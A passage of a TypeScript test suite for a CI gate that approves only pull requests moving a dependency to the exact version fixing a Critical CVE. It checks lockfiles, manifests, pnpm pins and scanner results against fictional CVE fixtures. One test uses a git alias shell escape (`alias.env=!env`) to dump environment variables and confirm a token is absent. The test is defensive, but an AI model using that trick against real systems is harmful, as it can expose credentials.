    expect(await held({ ...PACKAGE_FIX, 'package.json': FIXED_MANIFEST.replace('"^10.4.0"', '"^10.4.1"') })).toBe(
      at(11),
    );
  });

  it('a second file of the lockfile’s kind, or of pnpm’s settings: none is a pin', async () => {
    for (const path of [
      'pnpm-lock.branch.yaml',
      'packages/a/pnpm-lock.yaml',
      'package-lock.json',
      'yarn.lock',
      'npm-shrinkwrap.json',
      '.npmrc',
      'pnpm-workspace.yaml',
      '.pnpmfile.cjs',
      'patches/long.patch',
    ])
      expect(await held({ ...PACKAGE_FIX, [path]: 'x' })).toBe(
        `pins only: it changes ${path}, which is not one of the app's pins`,
      );
  });

  it('pnpm’s version from the head’s packageManager: the head’s manifest is never what pnpm runs as', async () => {
    const manifest = FIXED_MANIFEST.replace('pnpm@12.16.1', 'pnpm@12.16.2');
    expect(await held({ ...PACKAGE_FIX, 'package.json': manifest })).toBe(
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, package.json differs from the gate's own at line 3)`,
    );
    expect(
      await held({
        ...PACKAGE_FIX,
        'package.json': FIXED_MANIFEST.replace('"name": "shop",', '"name": "shop",\n  "pnpm": {},'),
      }),
    ).toMatch(/^pins only: the lockfile is not the one this move writes/);
  });

  it('the derivation’s git has pnpm’s clean environment, so the job’s token is not in its reach', async () => {
    const saved = process.env.GH_TOKEN;
    process.env.GH_TOKEN = 'the-jobs-token';
    try {
      const env = { PATH: process.env.PATH ?? '', HOME: tmpdir() };
      const seen = await cleanGit(env)(tmpdir(), '-c', 'alias.env=!env', 'env');
      expect(seen).not.toContain('the-jobs-token');
      expect(seen).not.toMatch(/^GH_TOKEN=/m);
      expect(seen).toContain(`HOME=${env.HOME}`);
    } finally {
      if (saved === undefined) delete process.env.GH_TOKEN;
      else process.env.GH_TOKEN = saved;
    }
  });

  it('the derivation’s pnpm is the gate’s own mise.lock’s, found from the gate’s checkout', async () => {
    const path = await pinnedPnpm();
    const locked = lockedPnpm(readFileSync(join(ROOT, 'mise.lock'), 'utf-8'), 'linux-x64').version;
    expect(execFileSync(path, ['--version'], { encoding: 'utf-8' }).trim()).toBe(locked);
  });
});

describe('the closed check: the head is read once, by one reader, only to be compared', () => {
  /** The lockfile and manifest with protobufjs at a version, as a head might give it or the gate write it. */
  const at = (version: string) => ({
    'pnpm-lock.yaml': LOCK.replaceAll('protobufjs@7.6.4', `protobufjs@${version}`).replace(
      'specifier: ^7.6.4\n        version: 7.6.4',
      `specifier: ^${version}\n        version: ${version}`,
    ),
    'package.json': MANIFEST.replace('"^7.6.4"', `"^${version}"`),
  });
  const advisories = (fixed: string) => ({
    'protobufjs@7.6.4': [{ id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed, severity: 'CRITICAL' }],
  });

  it('passes a head on the gate’s own target, and holds the same head at any other version of the package', async () => {
    const derived = { 'protobufjs@7.6.4>7.6.5': at('7.6.5') };
    expect(await criticalFix(io(at('7.6.5'), { derived, advisories: advisories('7.6.5') }), HEAD)).toHaveProperty(
      'title',
    );
    for (const other of ['7.6.6', '7.7.0', '8.0.0', '9.1.0', '7.6.5-rc.1', '7.6.6-beta.0', '7.6.4', '0.9.0'])
      expect(await held(at(other), { derived, advisories: advisories('7.6.5') })).toMatch(
        /^pins only: the lockfile is not the one this move writes \(for protobufjs 7\.6\.4 to 7\.6\.5, (pnpm-lock\.yaml|package\.json) differs from the gate's own at line \d+\)$/,
      );
    // The read's two shapes: a fix only on a later major moves to its lowest, never past it; a 0.x fix stays on its line.
    const major = { 'protobufjs@7.6.4>8.0.1': at('8.0.1') };
    expect(
      await criticalFix(io(at('8.0.1'), { derived: major, advisories: advisories('8.0.1, 9.0.0') }), HEAD),
    ).toHaveProperty('title');
    expect(await held(at('9.0.0'), { derived: major, advisories: advisories('8.0.1, 9.0.0') })).toMatch(
      /^pins only: the lockfile is not the one this move writes \(for protobufjs 7\.6\.4 to 8\.0\.1, /,
    );
  });

  it('reads the head’s lockfile and package.json through `head` alone, once, whatever the verdict', async () => {
    // The fake's diff throws if the proof reads either file's head there: each case below would reject.
    for (const [change, fakes] of [
      [PACKAGE_FIX, {}],
      [{ ...PACKAGE_FIX, 'package.json': MANIFEST.replace('"^7.6.4"', '"^8.0.0"') }, {}],
      [{ 'pnpm-lock.yaml': FIXED_LOCK }, {}],
      [
        PACKAGE_FIX,
        {
          advisories: {
            ...ADVISORIES,
            'pino@10.4.0': [
              { id: 'CVE-2026-8', pkg: 'pino', version: '10.4.0', fixed: '10.4.1', severity: 'CRITICAL' },
            ],
          },
        },
      ],
      [PACKAGE_FIX, { derived: { 'protobufjs@7.6.4>7.6.5': new PinsRefused('no') } }],
    ] as [Record<string, string>, Fakes][]) {
      const reads = { head: 0 };
      await criticalFix(io(change, { ...fakes, reads }), HEAD);
      expect(reads.head).toBe(1);
    }
    // Nor before the base names a move: a head with no Critical in its base is never read at all.
    const reads = { head: 0 };
    await criticalFix(io(PACKAGE_FIX, { advisories: {}, reads }), HEAD);
    expect(reads.head).toBe(0);
  });

  it('gives what `head` read to `asDerived` alone, in the proof’s own code', () => {
    const source = readFileSync(join(ROOT, 'scripts/critical-fix.ts'), 'utf-8');
    expect(source.match(/\bio\.head\(/g)).toEqual(['io.head(']);
    // The bytes are named once and used once, as `asDerived`'s first argument.
    expect(source.match(/\bheadBytes\b/g)?.length).toBe(2);
    expect(source).toContain('const headBytes = await io.head();');
    expect(source).toContain('asDerived(headBytes, written)');
  });
});

describe('the pieces', () => {
  it('reads a fixed version as the scanner writes one', () => {
    expect(atOrAbove('7.6.6', '7.6.5')).toBe(true);
    expect(atOrAbove('7.6.4', '7.6.5')).toBe(false);
    expect(atOrAbove('1.2.9', '1.2.8, 2.0.1')).toBe(true);
    expect(atOrAbove('2.0.0', '1.2.8, 2.0.1')).toBe(false);
    expect(atOrAbove('24.22.2', '^24.22.2 || ^22.20.1')).toBe(true);
    expect(atOrAbove('1.0.0', 'none')).toBeUndefined();
  });

  it('holds a finding fixed nowhere, and a finding that is not Critical', () => {
    const was: Scan = { packages: [{ name: 'a', version: '1.0.0' }], findings: [] };
    expect(scansShow([{ label: 'x', was, now: was }])).toMatchObject({
      reason: expect.stringMatching(/no Critical fixed/),
    });
  });

  it('holds a Critical gone from one platform’s image and still in the other’s', () => {
    const critical: Finding = {
      id: 'CVE-2026-60',
      pkg: 'libssl3',
      version: '3.0.1',
      fixed: '3.0.2',
      severity: 'CRITICAL',
    };
    const was = image([{ name: 'libssl3', version: '3.0.1' }], [critical]);
    const now = image([{ name: 'libssl3', version: '3.0.2' }]);
    expect(
      scansShow([
        { label: 'x (linux/amd64)', was, now: was },
        { label: 'x (linux/arm64)', was, now },
      ]),
    ).toMatchObject({
      reason: "the scans show no fix: libssl3's CVE-2026-60 is gone from x (linux/arm64) and still in x (linux/amd64)",
    });
  });

  it('works out the move from the base’s scan alone, by the daily scan’s own functions', () => {
    const was = scanLockfile(LOCK, ADVISORIES);
    expect(movesOf(was)).toEqual([{ ecosystem: 'npm', name: 'protobufjs', from: '7.6.4', to: '7.6.5' }]);
    // A Medium alone is no move.
    expect(movesOf(scanLockfile(LOCK, { 'pino@10.4.0': ADVISORIES['pino@10.4.0'] as Finding[] }))).toHaveProperty(
      'reason',
    );
    const finding = (version: string, fixed: string, severity = 'CRITICAL'): Finding => ({
      id: `CVE-${version}`,
      pkg: 'a',
      version,
      fixed,
      severity,
    });
    const of = (...findings: Finding[]) => movesOf({ packages: [], findings });
    // The first fix above each copy, and the furthest of them, every rating's: a Low's later fix is the target.
    expect(of(finding('1.0.0', '1.0.2, 2.0.1'), finding('1.0.0', '1.0.5', 'LOW'))).toEqual([
      { ecosystem: 'npm', name: 'a', from: '1.0.0', to: '1.0.5' },
    ]);
    // Across a major only when no fix is on its own: 1.9 has none on 1.x past it, so 2.0.1, never 3.x.
    expect(of(finding('1.9.0', '1.2.8, 2.0.1, 3.0.0'))).toEqual([
      { ecosystem: 'npm', name: 'a', from: '1.9.0', to: '2.0.1' },
    ]);
    // 0.x: the fix on its own line, which the pin step's caret admits.
    expect(of(finding('0.300.0', '0.300.1, 0.301.0'))).toEqual([
      { ecosystem: 'npm', name: 'a', from: '0.300.0', to: '0.300.1' },
    ]);
    // Two copies whose fixes are on two majors: the pin step moves to one version, so none is written.
    expect(of(finding('1.0.0', '1.0.1, 2.0.1'), finding('2.0.0', '1.0.1, 2.0.1'))).toEqual([
      {
        name: 'a',
        reason: "the scan's fix for a is 1.0.1 and 2.0.1, one on each major, and the pin step moves to one",
      },
    ]);
    const many = Array.from({ length: MOST_MOVES + 1 }, (_, i) => ({ ...finding('1.0.0', '1.0.1'), pkg: `p${i}` }));
    expect(of(...many)).toHaveProperty('reason');
  });

  it('compares the head’s files with the derivation’s, byte for byte, both ways', () => {
    const head = { 'pnpm-lock.yaml': FIXED_LOCK };
    expect(asDerived(head, { 'pnpm-lock.yaml': FIXED_LOCK })).toBeUndefined();
    expect(asDerived(head, { 'pnpm-lock.yaml': `${FIXED_LOCK}\n` })).toMatch(/differs from the gate's own at line/);
    expect(asDerived(head, { 'pnpm-lock.yaml': FIXED_LOCK, 'package.json': FIXED_MANIFEST })).toBe(
      'the move changes package.json, and the head does not',
    );
    expect(asDerived({ ...head, 'package.json': FIXED_MANIFEST }, { 'pnpm-lock.yaml': FIXED_LOCK })).toBe(
      'the head changes package.json, and the move does not',
    );
  });
});
